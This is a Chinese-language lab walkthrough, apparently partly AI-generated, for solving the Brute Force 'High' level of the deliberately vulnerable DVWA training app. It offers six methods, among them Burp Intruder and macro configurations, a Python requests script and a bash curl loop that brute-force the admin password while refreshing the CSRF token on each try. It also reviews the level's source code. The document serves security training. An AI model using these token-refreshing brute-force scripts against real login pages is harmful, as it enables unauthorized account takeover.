# DVWA Brute Force High 完整 6 套通关方案（含 Burp 手动、宏、Python 脚本、Hydra 局限、源码审计、Impossible 对比）

你说的 VWA 是**DVWA（Damn Vulnerable Web Application）**，Brute Force High 核心难点：每次请求携带**动态 user\_token（CSRF 令牌）**，上一次响应才会生成下一次有效 Token，多线程直接失效；默认账号`admin`，正确密码`password`。

## 前置环境准备



1. DVWA 安全等级切换为`High`

2. Burp Suite 代理抓包，随便输账号密码登录抓 POST 包，请求参数：

   `username=admin&password=xxx&Login=Login&user_token=动态值`

3. 基础字典：用户名字典`admin`，密码字典`password,123456,abc123,letmein,charley`

## 方案 1：Burp Intruder 递归 Grep（最标准、考试首选，第 1 套）

### 步骤 1：Positions 攻击模式配置



1. 抓到登录包右键 → Send to Intruder

2. Attack type 选 **Pitchfork（草叉模式）**

3. 标记 2 个变量：`password=§xxx§`、`user_token=§初始token§`

### 步骤 2：Payload 配置



* Payload 集 1（password）：Simple list，导入弱密码字典

* Payload 集 2（user\_token）：Payload 类型选 **Recursive grep（递归提取）**

1. 点「设置」→ 检索 - 提取 → 添加提取规则

   正则匹配：`name="user_token" value="([0-9a-f]+)"`

2. 点击「获取响应」，粘贴页面原生初始 token 填入「首次请求初始 payload」

### 步骤 3：关键全局设置（必做，否则爆破失败）



1. Resource Pool 资源池：新建池，**最大并发请求 = 1**（单线程，等上一条响应拿到新 token 再发下一条）

2. Settings → 重定向：跟随重定向**总是**，勾选重定向期间处理 Cookie

3. 错误处理：网络重试次数 = 1，防止重复消耗 token

4. 取消「生成未修改的基本请求」

### 步骤 4：攻击与结果判断

启动攻击，按**Length 响应长度**排序：



* 密码错误：响应长度固定约 4724

* 密码正确：长度唯一（4762），页面出现登录成功头像

## 方案 2：Burp Session 宏自动刷新 Token（稳定进阶，第 2 套）

递归 Grep 容易出现 token 缓存 bug，宏方案更稳定：



1. Burp → Project options → Sessions → Session handling rules → Add 规则

2. 添加操作：`Run a macro` → 新建宏

3. 宏录制：GET 访问 Brute Force 登录页，自动提取响应里`user_token`

4. 宏作用域：仅匹配 DVWA 暴力破解 URL

5. Intruder 无需 Recursive Grep，payload2 填任意占位，宏会在每次发包前自动拉取最新 token

## 方案 3：Python Requests 自动化脚本（脱离 Burp，第 3 套）

原理：每次发包前先 GET 登录页提取新 token，再 POST 提交账号密码 + 新 token



```
import requests,re

session = requests.Session()

url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"

\# DVWA Cookie（替换你自己的PHPSESSID、security=High）

cookies = {"PHPSESSID":"xxxx","security":"high"}

pass\_list = \["password","123456","abc123"]

for pwd in pass\_list:

&#x20;   \# 第一步：获取新token

&#x20;   res\_get = session.get(url,cookies=cookies)

&#x20;   token = re.search(r'name="user\_token" value="(.\*?)"',res\_get.text).group(1)

&#x20;   \# 第二步：带token提交登录

&#x20;   data = {

&#x20;       "username":"admin",

&#x20;       "password":pwd,

&#x20;       "Login":"Login",

&#x20;       "user\_token":token

&#x20;   }

&#x20;   res\_post = session.get(url,params=data,cookies=cookies)

&#x20;   if "Username and password incorrect." not in res\_post.text:

&#x20;       print(f"破解成功！密码：{pwd}")

&#x20;       break
```

运行输出`破解成功！密码：password`即通关。

## 方案 4：手动逐次更换 Token（无工具纯浏览器，第 4 套）

适合无渗透工具环境：



1. 打开 Brute Force 登录页，查看网页源码复制当前`user_token`

2. URL 拼接 GET 请求（DVWA High 为 GET 传参）：

   `http://ip/dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login&user_token=复制的token`

3. 访问后页面刷新，**重新复制新 token**，更换 password 值重复测试

4. 输入 password 时页面不再提示账号密码错误，通关

## 方案 5：Hydra 局限性 + 搭配 curl 脚本（命令行工具，第 5 套）

### 重点：Hydra 原生无法处理动态 Token，直接爆破全部失败

解决思路：写 shell 循环 curl 脚本（替代 hydra），逻辑同 Python：



```
\#!/bin/bash

COOKIE="PHPSESSID=你的session; security=high"

URL="http://127.0.0.1/dvwa/vulnerabilities/brute/"

PASS=("password" "123456" "abc123")

for p in \${PASS\[@]};do

\# 获取token

TOKEN=\$(curl -s -H "Cookie:\$COOKIE" \$URL | grep -oP 'user\_token" value="\K.\*?(?=")')

\# 提交登录

RES=\$(curl -s -H "Cookie:\$COOKIE" "\$URL?username=admin\&password=\$p\&Login=Login\&user\_token=\$TOKEN")

if \[\[ ! \$RES =\~ "incorrect" ]];then

echo "成功密码:\$p"

exit 0

fi

done
```

## 方案 6：源码审计理解防御 + 绕过原理（理论通关，第 6 套）

### High 级别核心源码防御逻辑



```
// 校验CSRF Token，token存储在session，每次页面刷新重置

checkToken( $\_GET\[ 'user\_token' ] );

// 防SQL注入转义

\$user = mysql\_real\_escape\_string( $\_GET\[ 'username' ] );

\$pass = mysql\_real\_escape\_string( $\_GET\[ 'password' ] );

// SQL查询

\$query = "SELECT \* FROM users WHERE user='\$user' AND password='\$pass' LIMIT 1;";
```

### 绕过核心原理（通关逻辑）



1. 防御 1：动态 token 校验 → 绕过：每次请求前置获取最新页面 token 带入发包

2. 防御 2：mysql\_real\_escape\_string 转义 → 不影响暴力破解（已知 admin 账号，无需注入）

3. 无登录失败延迟、无账号锁定，仅 token 作为唯一拦截点

### 补充：Impossible 难度无法通关对比

Impossible 增加**账号锁定（3 次错误锁账号）+SHA256 加盐哈希**，无可行暴力破解方案，用来区分 High 与最高安全级差异。

# 通关关键避坑点



1. **线程必须 = 1**：多线程会同时复用同一个 token，服务器判定 token 失效，全部返回错误

2. 不能固定静态 token：每次响应 token 刷新，旧 token 直接作废

3. DVWA High 是**GET 传参**，不是 POST，抓包与脚本都要用 GET

4. 判断成功标识：页面无`Username and password incorrect.`文本，出现用户头像

# 最简通关推荐顺序

新手考试：方案 1（Burp 递归 Grep）

离线无 Burp：方案 3（Python 脚本）

命令行环境：方案 5（curl shell 脚本）

理论答题：方案 6（源码审计）

> （注：文档部分内容可能由 AI 生成）